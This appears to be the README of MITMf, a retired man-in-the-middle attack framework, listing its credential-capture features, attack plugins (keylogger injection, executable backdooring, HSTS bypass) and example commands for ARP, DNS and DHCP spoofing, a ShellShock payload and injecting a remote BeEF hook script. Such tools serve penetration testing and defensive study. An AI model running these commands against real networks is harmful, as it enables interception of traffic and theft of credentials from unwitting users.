![Supported Python versions](https://img.shields.io/badge/python-2.7-blue.svg)
![Latest Version](https://img.shields.io/badge/mitmf-0.9.8%20--%20The%20Dark%20Side-red.svg)
![Supported OS](https://img.shields.io/badge/Supported%20OS-Linux-yellow.svg)
[![Code Climate](https://codeclimate.com/github/byt3bl33d3r/MITMf/badges/gpa.svg)](https://codeclimate.com/github/byt3bl33d3r/MITMf)
[![Build Status](https://travis-ci.org/byt3bl33d3r/MITMf.svg)](https://travis-ci.org/byt3bl33d3r/MITMf)
[![Coverage Status](https://coveralls.io/repos/byt3bl33d3r/MITMf/badge.svg?branch=master&service=github)](https://coveralls.io/github/byt3bl33d3r/MITMf?branch=master)

# MITMf

Framework for Man-In-The-Middle attacks

**This project is no longer being updated. MITMf was written to address the need, at the time, of a modern tool for performing Man-In-The-Middle attacks. Since then many other tools have been created to fill this space, you should probably be using [Bettercap](https://github.com/bettercap/bettercap) as it is far more feature complete and better maintained.**

Quick tutorials, examples and developer updates at: https://byt3bl33d3r.github.io

This tool is based on [sergio-proxy](https://github.com/supernothing/sergio-proxy) and is an attempt to revive and update the project.

Contact me at:
- Twitter: @byt3bl33d3r
- IRC on Freenode: #MITMf
- Email: byt3bl33d3r@protonmail.com

**Before submitting issues, please read the relevant [section](https://github.com/byt3bl33d3r/MITMf/wiki/Reporting-a-bug) in the wiki .**

Installation
============

Please refer to the wiki for [installation instructions](https://github.com/byt3bl33d3r/MITMf/wiki/Installation)

Description
============
MITMf aims to provide a one-stop-shop for Man-In-The-Middle and network attacks while updating and improving
existing attacks and techniques.

Originally built to address the significant shortcomings of other tools (e.g Ettercap, Mallory), it's been almost completely 
re-written from scratch to provide a modular and easily extendible framework that anyone can use to implement their own MITM attack.

Features
========

- The framework contains a built-in SMB, HTTP and DNS server that can be controlled and used by the various plugins, it also contains a modified version of the SSLStrip proxy that allows for HTTP modification and a partial HSTS bypass.

- As of version 0.9.8, MITMf supports active packet filtering and manipulation (basically what etterfilters did, only better),
allowing users to modify any type of traffic or protocol.

- The configuration file can be edited on-the-fly while MITMf is running, the changes will be passed down through the framework: this allows you to tweak settings of plugins and servers while performing an attack.

- MITMf will capture FTP, IRC, POP, IMAP, Telnet, SMTP, SNMP (community strings), NTLMv1/v2 (all supported protocols like HTTP, SMB, LDAP etc.) and Kerberos credentials by using [Net-Creds](https://github.com/DanMcInerney/net-creds), which is run on startup.

- [Responder](https://github.com/SpiderLabs/Responder) integration allows for LLMNR, NBT-NS and MDNS poisoning and WPAD rogue server support.

Active packet filtering/modification
====================================

You can now modify any packet/protocol that gets intercepted by MITMf using Scapy! (no more etterfilters! yay!)

For example, here's a stupid little filter that just changes the destination IP address of ICMP packets:

```python
if packet.haslayer(ICMP):
	log.info('Got an ICMP packet!')
	packet.dst = '192.168.1.0'
```

- Use the ```packet``` variable to access the packet in a Scapy compatible format
- Use the ```data``` variable to access the raw packet data

Now to use the filter all we need to do is: ```python mitmf.py -F ~/filter.py```

You will probably want to combine that with the **Spoof** plugin to actually intercept packets from someone else ;)

**Note**: you can modify filters on-the-fly without restarting MITMf! 

Examples
========

The most basic usage, starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface enp3s0:

```python mitmf.py -i enp3s0```

ARP poison the whole subnet with the gateway at 192.168.1.1 using the **Spoof** plugin:

```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1```

Same as above + a WPAD rogue proxy server using the **Responder** plugin:

```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --responder --wpad```

ARP poison 192.168.1.16-45 and 192.168.0.1/24 with the gateway at 192.168.1.1:

```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.2.16-45,192.168.0.1/24 --gateway 192.168.1.1```

Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):

```python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1```

Enable LLMNR/NBTNS/MDNS spoofing:

```python mitmf.py -i enp3s0 --responder --wredir --nbtns```

Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):

```python mitmf.py -i enp3s0 --spoof --dhcp```

Same as above with a ShellShock payload that will be executed if any client is vulnerable:

```python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'```

Inject an HTML IFrame using the **Inject** plugin:

```python mitmf.py -i enp3s0 --inject --html-url http://some-evil-website.com```

Inject a JS script:

```python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js```

Start a captive portal that redirects everything to http://SERVER/PATH:

```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portalurl http://SERVER/PATH```

Start captive portal at http://your-ip/portal.html using default page /portal.html (thx responder) and /CaptiveClient.exe (not included) from the config/captive folder:

```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive```

Same as above but with hostname captive.portal instead of IP (requires captive.portal to resolve to your IP, e.g. via DNS spoof):

```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --use-dns```

Serve a captive portal with an additional SimpleHTTPServer instance serving the LOCALDIR at http://IP:8080 (change port in mitmf.config):

```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portaldir LOCALDIR```

Same as above but with hostname:

```python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --portaldir LOCALDIR --use-dns```

And much much more! 

Of course you can mix and match almost any plugin together (e.g. ARP spoof + inject + Responder etc..)

For a complete list of available options, just run ```python mitmf.py --help```

# Currently available plugins

- **HTA Drive-By**     : Injects a fake update notification and prompts clients to download an HTA application
- **SMBTrap**          : Exploits the 'SMB Trap' vulnerability on connected clients
- **ScreenShotter**    : Uses HTML5 Canvas to render an accurate screenshot of a clients browser
- **Responder**        : LLMNR, NBT-NS, WPAD and MDNS poisoner
- **SSLstrip+**        : Partially bypass HSTS
- **Spoof**            : Redirect traffic using ARP, ICMP, DHCP or DNS spoofing
- **BeEFAutorun**      : Autoruns BeEF modules based on a client's OS or browser type
- **AppCachePoison**   : Performs HTML5 App-Cache poisoning attacks 
- **Ferret-NG**        : Transparently hijacks client sessions
- **BrowserProfiler**  : Attempts to enumerate all browser plugins of connected clients
- **FilePwn**          : Backdoor executables sent over HTTP using the Backdoor Factory and BDFProxy
- **Inject**           : Inject arbitrary content into HTML content
- **BrowserSniper**    : Performs drive-by attacks on clients with out-of-date browser plugins
- **JSkeylogger**      : Injects a Javascript keylogger into a client's webpages
- **Replace**          : Replace arbitrary content in HTML content
- **SMBAuth**          : Evoke SMB challenge-response authentication attempts
- **Upsidedownternet** : Flips images 180 degrees
- **Captive**          : Creates a captive portal, redirecting HTTP requests using 302

# How to fund my tea & sushi reserve

BTC: 1ER8rRE6NTZ7RHN88zc6JY87LvtyuRUJGU

ETH: 0x91d9aDCf8B91f55BCBF0841616A01BeE551E90ee

LTC: LLMa2bsvXbgBGnnBwiXYazsj7Uz6zRe4fr

